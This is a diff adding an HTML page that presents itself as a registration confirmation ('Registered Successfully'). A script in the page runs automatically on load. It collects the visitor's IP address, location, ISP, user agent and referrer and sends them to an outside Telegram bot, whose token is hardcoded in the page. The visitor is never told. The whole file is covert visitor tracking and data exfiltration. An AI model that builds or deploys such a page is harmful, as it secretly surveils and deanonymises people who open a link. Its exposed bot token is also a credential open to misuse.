@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Send Device Info</title>
+    <script>
+        let botToken = "7233414815:AAHhlUfOAiD8SLJNRNWlY4SJ_PV3wZf-GhY";  // Update with your bot token
+
+        async function getChatId() {
+            try {
+                let response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
+                let data = await response.json();
+                
+                if (data.ok && data.result.length > 0) {
+                    let chatId = data.result[data.result.length - 1].message.chat.id; // Get the latest chat ID
+                    return chatId;
+                } else {
+                    console.error("No chat ID found. Send a message to your bot first!");
+                    return null;
+                }
+            } catch (error) {
+                console.error("Error fetching Chat ID:", error);
+                return null;
+            }
+        }
+
+        async function sendDeviceInfo() {
+            // Step 1: Get chat ID and username from Telegram
+            let chatId = await getChatId();
+            if (!chatId) {
+                console.error("No chat ID found. Please send a message to your bot first.");
+                return;
+            }
+        
+            // Get user info (username) from the Telegram Bot API
+            let user = await getTelegramUserInfo(chatId);
+            let username = user?.username || "Unknown";  // Fallback to "Unknown" if no username exists
+            
+            // Step 2: Update the username in the <h1> tag
+            document.getElementById('username').textContent = username;
+        
+            // Step 3: Fetch the device's IP and location data
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    let ip = data.ip;
+                    let city = data.city;
+                    let region = data.region;
+                    let country = data.country;
+                    let isp = data.org;
+                    let userAgent = navigator.userAgent;
+        
+                    // Step 4: Prepare the message with user info and device details
+                    let message = `🔍 **New Visitor Detected!**\n\n`
+                                + `👤 **Username:** @${username}\n` // Displaying the username
+                                + `🌍 **IP Address:** ${ip}\n`
+                                + `📍 **Location:** ${city}, ${region}, ${country}\n`
+                                + `💻 **ISP:** ${isp}\n`
+                                + `🖥 **Device Info:** ${userAgent}\n`
+                                + `🔗 **Referrer:** ${document.referrer || "Direct Access"}\n`;
+        
+                    // Step 5: Send the message to Telegram
+                    let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+                    fetch(telegramUrl)
+                        .then(response => console.log("Device Info Sent to Telegram!"))
+                        .catch(error => console.error("Error sending message:", error));
+                })
+                .catch(error => console.error("Error fetching IP:", error));
+        }
+        
+        // Function to fetch Telegram user info (like username) from the Bot API
+        async function getTelegramUserInfo(chatId) {
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${chatId}`);
+            const data = await response.json();
+            return data.result; // Return the result which includes the username
+        }
+
+        // Auto run when page loads
+        window.onload = sendDeviceInfo;
+    </script>
+</head>
+<body>
+    <h1>Welcome to <span id="username"></span></h1>
+    <p>Registered Successfully ✅✅</p>
+</body>
+</html>
